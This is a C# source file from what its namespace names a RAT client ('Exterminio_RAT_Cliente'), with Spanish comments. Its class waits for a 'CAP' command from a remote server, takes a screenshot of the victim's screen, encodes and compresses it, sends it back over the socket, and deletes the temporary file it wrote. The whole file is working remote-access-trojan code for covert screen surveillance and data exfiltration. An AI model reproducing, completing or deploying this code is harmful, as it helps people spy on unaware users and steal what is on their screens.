using System;
using System.Drawing;
using System.Drawing.Imaging;
using System.IO;
using System.IO.Compression;
using System.Net.Sockets;
using System.Text;
using System.Threading.Tasks;
using System.Windows.Forms;
using System.Linq;

namespace Exterminio_RAT_Cliente
{
    public class ScreenCaptureHandler
    {
        private readonly Form1 mainForm;
        private readonly string tempDirectory;

        public ScreenCaptureHandler(Form1 form)
        {
            mainForm = form;
            tempDirectory = Path.Combine(Application.StartupPath, "Temp");
            
            // Crear directorio temporal si no existe
            if (!Directory.Exists(tempDirectory))
            {
                Directory.CreateDirectory(tempDirectory);
            }
        }

        public Task HandleCaptureCommand(NetworkStream stream, System.Threading.Mutex socketMutex = null)
        {
            try
            {
                Console.WriteLine("Recibido comando CAP, iniciando captura de pantalla...");
                
                // Capturar pantalla
                Bitmap screenshot = CaptureScreen();
                Console.WriteLine($"Captura de pantalla realizada: {screenshot.Width}x{screenshot.Height}");
                
                // Guardar imagen temporal
                string tempFileName = $"capture_{DateTime.Now:yyyyMMdd_HHmmss_fff}.png";
                string tempFilePath = Path.Combine(tempDirectory, tempFileName);
                screenshot.Save(tempFilePath, ImageFormat.Png);
                Console.WriteLine($"Imagen guardada temporalmente: {tempFilePath}");
                
                // Leer imagen desde disco
                byte[] imageBytes = File.ReadAllBytes(tempFilePath);
                Console.WriteLine($"Imagen leída: {imageBytes.Length} bytes");
                
                // Convertir a Base64
                string base64String = Convert.ToBase64String(imageBytes);
                byte[] base64Bytes = Encoding.UTF8.GetBytes(base64String);
                Console.WriteLine($"Imagen convertida a Base64: {base64Bytes.Length} bytes");
                
                // Comprimir con Deflate
                byte[] compressedData = CompressData(base64Bytes);
                Console.WriteLine($"Datos comprimidos: {compressedData.Length} bytes");
                
                // No necesitamos enviar prefijo de longitud, usamos formato "CAP:Base64"
                Console.WriteLine($"Datos comprimidos listos para enviar: {compressedData.Length} bytes");
                
                // Enviar datos comprimidos con formato "CAP:Base64" en una sola operación
                string capMessage = "CAP:" + Convert.ToBase64String(compressedData);
                byte[] capBytes = Encoding.UTF8.GetBytes(capMessage);
                
                // Usar Mutex para proteger el envío por socket
                if (socketMutex != null)
                {
                    if (socketMutex.WaitOne(5000)) // Esperar máximo 5 segundos
                    {
                        try
                        {
                            Console.WriteLine("Mutex de socket adquirido, enviando datos...");
                            // Usar Write síncrono para mantener el contexto del Mutex
                            stream.Write(capBytes, 0, capBytes.Length);
                            Console.WriteLine($"Datos comprimidos enviados completamente: {capBytes.Length} bytes");
                        }
                        finally
                        {
                            socketMutex.ReleaseMutex();
                            Console.WriteLine("Mutex de socket liberado");
                        }
                    }
                    else
                    {
                        Console.WriteLine("Timeout al adquirir Mutex de socket");
                        throw new Exception("Timeout al enviar datos por socket");
                    }
                }
                else
                {
                    // Enviar sin Mutex si no se proporciona
                    stream.Write(capBytes, 0, capBytes.Length);
                    Console.WriteLine($"Datos comprimidos enviados completamente: {capBytes.Length} bytes");
                }
                
                Console.WriteLine("Captura enviada exitosamente al servidor");
                
                // Limpiar archivo temporal
                try
                {
                    File.Delete(tempFilePath);
                    Console.WriteLine("Archivo temporal eliminado");
                }
                catch (Exception ex)
                {
                    Console.WriteLine($"Error eliminando archivo temporal: {ex.Message}");
                }
                
                // Liberar recursos
                screenshot.Dispose();
            }
            catch (Exception ex)
            {
                Console.WriteLine($"Error en captura de pantalla: {ex.Message}");
            }
            
            return Task.CompletedTask;
        }

        private Bitmap CaptureScreen()
        {
            try
            {
                // Obtener el tamaño de la pantalla principal
                Rectangle screenBounds = Screen.PrimaryScreen.Bounds;
                
                // Crear bitmap del tamaño de la pantalla
                Bitmap screenshot = new Bitmap(screenBounds.Width, screenBounds.Height);
                
                using (Graphics graphics = Graphics.FromImage(screenshot))
                {
                    // Capturar toda la pantalla
                    graphics.CopyFromScreen(screenBounds.X, screenBounds.Y, 0, 0, screenBounds.Size);
                }
                
                return screenshot;
            }
            catch (Exception ex)
            {
                Console.WriteLine($"Error capturando pantalla: {ex.Message}");
                throw;
            }
        }

        private byte[] CompressData(byte[] data)
        {
            using (MemoryStream originalStream = new MemoryStream(data))
            using (MemoryStream compressedStream = new MemoryStream())
            {
                using (DeflateStream deflateStream = new DeflateStream(compressedStream, CompressionMode.Compress))
                {
                    originalStream.CopyTo(deflateStream);
                }
                return compressedStream.ToArray();
            }
        }
    }
}
